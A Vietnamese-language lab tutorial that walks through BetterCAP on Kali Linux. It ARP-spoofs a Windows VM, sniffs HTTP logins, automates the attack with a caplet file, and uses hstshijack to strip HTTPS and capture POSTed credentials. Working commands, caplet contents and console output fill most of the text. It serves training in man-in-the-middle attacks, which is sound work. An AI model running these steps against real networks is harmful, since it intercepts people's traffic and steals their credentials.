# Chặn lưu lượng HTTP
BetterCAP là một framework mạnh mẽ, dễ mở rộng và di động được viết bằng Go nhằm cung cấp cho các nhà nghiên cứu bảo mật, red teamer và kỹ sư đảo ngược một giải pháp tất cả trong một, dễ sử dụng với tất cả các tính năng cần thiết để thực hiện trinh sát và tấn công mạng WiFi, thiết bị Bluetooth Low Energy, thiết bị HID không dây và mạng Ethernet.

<p align="center">
  <img width="30%" src="https://raw.githubusercontent.com/bettercap/media/master/logo.png" />
</p>

Tài liệu chính thức Bettercap: https://www.bettercap.org/intro/

Repository chính thức: https://github.com/bettercap/bettercap

### Mục tiêu
* Chặn lưu lượng truy cập và thu thập thông tin xác thực của người dùng (HTTP và HTTPS).

### Yêu cầu
* Máy ảo Kali Linux (Máy tấn công)
* Bất kỳ máy ảo Windows nào (Mục tiêu)

***

## Cài đặt BetterCAP
Khởi động Kali Linux, mở một cửa sổ Terminal mới và nhập các lệnh sau:

`apt-get update`
`apt-get install bettercap`

## Các module BetterCAP
Để khởi động chương trình, nhập `bettercap` và chỉ định giao diện mạng hiện tại:

`bettercap -iface eth0`

Nhập **help** để liệt kê tất cả các module khả dụng:

`help`

![modules](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/7e4aa214016257e51ca5c19231801f0554de6134/bettercap-1.png)

Module **events.stream** đang **chạy** theo mặc định, module này được bật theo mặc định và chịu trách nhiệm báo cáo các sự kiện (log, máy chủ mới được phát hiện, v.v.) được tạo bởi các module khác trong phiên tương tác. Hơn nữa, nó có thể được sử dụng để thực thi lệnh một cách tự động khi các sự kiện cụ thể xảy ra.

**Để thực hiện tấn công MITM, chúng ta sẽ sử dụng các module dưới đây:**

module | Mô tả
-- | --
`net.probe` | Khi được kích hoạt, module này sẽ gửi các gói tin dò tìm khác nhau đến mỗi IP trong subnet hiện tại để module net.recon có thể phát hiện chúng. [[+]](https://www.bettercap.org/modules/ethernet/net.probe/)
`net.recon` | Module này chịu trách nhiệm đọc bảng ARP của hệ thống theo chu kỳ để phát hiện các máy chủ mới trên mạng. [[+]](https://www.bettercap.org/modules/ethernet/net.recon/)
`arp.spoof` | Module này liên tục giả mạo các máy chủ được chọn trên mạng bằng cách sử dụng các gói ARP được tạo đặc biệt để thực hiện tấn công MITM. [[+]](https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/)
`net.sniff` | Module này là một công cụ bắt gói tin mạng và fuzzer, hỗ trợ cả cú pháp BPF và biểu thức chính quy để lọc. Nó cũng có thể phân tích một số giao thức chính để thu thập thông tin xác thực. [[+]](https://www.bettercap.org/modules/ethernet/net.sniff/)

_Bạn có thể nhập `help` theo sau là tên `module` để xem chi tiết về module đó:_
![b2](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/c2be3479c96a94b3d2c042e8c8c4df20a4a06b57/bettercap-2.png)


## Thiết lập các module để thực hiện ARP spoofing


1. Khởi động module **prober** để gửi các gói tin dò tìm khác nhau đến mỗi IP trong subnet hiện tại để module **net.recon** có thể phát hiện chúng. _(Lưu ý: module prober có thể tự động khởi động module net.recon)._
`net.probe on`

```
10.0.2.0/24 > 10.0.2.42  » net.probe on
10.0.2.0/24 > 10.0.2.42  » [11:43:32] [sys.log] [inf] net.probe starting net.recon as a requirement for net.probe
10.0.2.0/24 > 10.0.2.42  » [11:43:32] [endpoint.new] endpoint 10.0.2.3 detected as 07:00:27:11:6c:7d .
10.0.2.0/24 > 10.0.2.42  » [11:43:33] [endpoint.new] endpoint 10.0.2.43 detected as 07:00:27:81:d6:f2 .
```
Trong lab của tôi, **10.0.2.43** là máy ảo Windows, địa chỉ này có thể khác với môi trường ảo của bạn.

2. Khởi động phát hiện máy chủ mạng:
`net.recon on`

* Lưu ý: bạn có thể nhập `net.show` để xem tất cả các client đang kết nối cùng địa chỉ IP và MAC.

3. Đặt tùy chọn **fullduplex** của module **arp.spoof** thành **true**. Khi đặt thành true, cả mục tiêu và gateway đều sẽ bị tấn công, nếu không chỉ có mục tiêu bị tấn công (nếu router có cơ chế bảo vệ ARP spoofing thì cuộc tấn công sẽ thất bại).
`set arp.spoof.fullduplex true`

4. Chỉ định mục tiêu để giả mạo. _(Danh sách phân tách bằng dấu phẩy gồm địa chỉ MAC, địa chỉ IP, phạm vi IP hoặc bí danh để giả mạo)._
`set arp.spoof.targets 10.0.2.43`

5. Khởi động ARP spoofer:
`arp.spoof on`

```
10.0.2.0/24 > 10.0.2.42  » [12:03:58] [sys.log] [inf] arp.spoof enabling forwarding
10.0.2.0/24 > 10.0.2.42  » [12:03:58] [sys.log] [war] arp.spoof full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.
10.0.2.0/24 > 10.0.2.42  » [12:03:58] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
```

6. Khởi động packet sniffer:
`net.sniff on`

7. Nhập `help` để liệt kê các module đang chạy:
![modules2](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/9b7efcd559aef438cbbf1aa8a14ceeced52b19d5/bettercap-3.png)

### Cuộc tấn công ARP spoofing
Bettercap đang đánh lừa **router** và **máy mục tiêu (Windows)**, đặt **máy tấn công (Kali)** vào giữa kết nối.

![arp](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/913307b303fe83f04dd10b2c9760fe370e95a1e6/arp-4.png)

**Trên máy Windows**, tôi sẽ sử dụng **lệnh bảng arp** để xem những gì đang xảy ra:

![arp5](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/af2872eca1b4d3ecf5c2b3979d8ffd33d1652186/arp-5.png)

Như bạn có thể thấy, máy Windows 'nghĩ' rằng địa chỉ MAC của **router** giống với của **Kali** vì bảng ARP đã bị giả mạo.


### Tạo lưu lượng truy cập trên máy mục tiêu.

1. Đăng nhập vào máy ảo Windows.
2. Khởi động trình duyệt và nhập URL: http://testhtml5.vulnweb.com
3. Đăng nhập vào trang web thử nghiệm lỗ hổng này với thông tin xác thực mẫu: **user: admin | password: password**.

### Chụp và phân tích từng request
* Quay lại Bettercap trên máy Kali và phân tích tất cả các request được gửi từ Windows.

![b7](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e27e815cbb390ab5c7d5928fe897f49a71cf73ce/bettercap-7.png)

Như bạn có thể thấy, chúng ta đã chụp được thông tin xác thực gửi đến trang web. Bất cứ thứ gì máy mục tiêu gửi và nhận đều sẽ được chụp bởi máy Kali Linux.

_**Lưu ý**: kỹ thuật này hoạt động trên các trang web HTTP, không phải HTTPS. Để thực hiện hành động này bạn cần vượt qua HSTS (HTTP Strict Transport Security). Bạn có thể thực hiện kỹ thuật này bằng Bettercap và caplet [hstshijack](https://github.com/bettercap/caplets/tree/master/hstshijack)._

## Tự động hóa BetterCAP bằng Caplets
Để làm việc hiệu quả hơn, bạn có thể tự động hóa việc thiết lập các module bằng cách tạo một **tệp Caplet** đơn giản (file.cap) và thêm các lệnh trên từng dòng.

1. Tạo caplet:
`touch spoof.cap`

2. Thêm các lệnh và lưu lại:
`nano spoof.cap`

```sh
net.probe on
set arp.spoof.fullduplex true 
set arp.spoof.targets 10.0.2.5
arp.spoof on
set net.sniff.local true
net.sniff on
```
Như bạn có thể thấy, đây là các lệnh tương tự theo thứ tự mà bạn đã sử dụng trước đó.

3. Khởi động **Bettercap** bằng **Caplet** spoof mà bạn đã tạo:
`bettercap -iface eth0 -caplet spoof.cap`


## Vượt qua HTTPS bằng hstshijack
Module này tiêm các tệp HTML & JS với payload giả mạo các hostname được nhắm mục tiêu và giao tiếp với bettercap, tiết lộ tất cả các URL được phát hiện trong tài liệu được tiêm.

Khi bettercap nhận được callback với URL mới, nó gửi một yêu cầu HEAD để tìm hiểu xem host trong URL này có gửi chuyển hướng HTTPS hay không và ghi lại log.

Điều này được thực hiện để bettercap có thể biết liệu nó có nên MITM kết nối SSL với một host hay không, trước khi nạn nhân điều hướng đến host đó.

**BetterCAP đi kèm với hstshijack theo mặc định.**

Repository hstshijack chính thức:
https://github.com/bettercap/caplets/blob/master/hstshijack/README.md

hstshijack tùy chỉnh của tôi với spoof caplet:
https://github.com/Samsar4/Caplets

**Lưu ý:** Phương pháp này với payload mặc định không hoạt động trên một số trang web phổ biến như Twitter hoặc Facebook, vì các trình duyệt hiện đại có biện pháp bảo mật được hardcode cho những trang web đó. Nhưng nó hoạt động trên phần lớn các trang web đang sử dụng HTTPS.

1. Tạo một caplet tên là **spoof.cap**

2. Thêm các tham số sau (nhớ đặt địa chỉ IP mục tiêu vào arp.spoof.targets):
```sh
net.probe on
set arp.spoof.fullduplex true 
set arp.spoof.targets <ĐỊA CHỈ IP MỤC TIÊU> 
arp.spoof on
set net.sniff.local true
net.sniff on
```

3. Trong cùng thư mục bạn đã tạo caplet, khởi động **BetterCAP** bằng **Caplet** spoof.cap mà bạn đã tạo:
`bettercap -iface eth0 -caplet spoof.cap`

4. Trên BetterCAP, khởi chạy hstshijack:
`hstshijack/hstshijack`
![hstshijack](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/02af023f2abc73cbda37c644eaf1128f222a612a/hstshijack.png)

5. Chuyển lại sang Windows và mở trình duyệt.

6. Trong lab này chúng ta sẽ thử nghiệm trang web phổ biến **StackOverflow**, nhập URL: stackoverflow.com và nhấn Enter.
![hstshijack2](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/4126125b5858854a68d97552a12041f2e7ad5122/hstshijack-3.png)
Như bạn có thể thấy HTTPS đã được vượt qua thành công và toàn bộ trang web được tải.

7. Thử đăng nhập bằng tài khoản giả để kiểm tra.

8. Sau khi bạn gửi thông tin xác thực giả, chuyển lại BetterCAP trên Kali Linux và cố gắng tìm **method POST** được bắt từ BetterCAP, bạn sẽ tìm thấy thông tin đăng nhập đã nhập, như hình bên dưới:
![hstshijack3](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/02af023f2abc73cbda37c644eaf1128f222a612a/hstshijack-2.png)
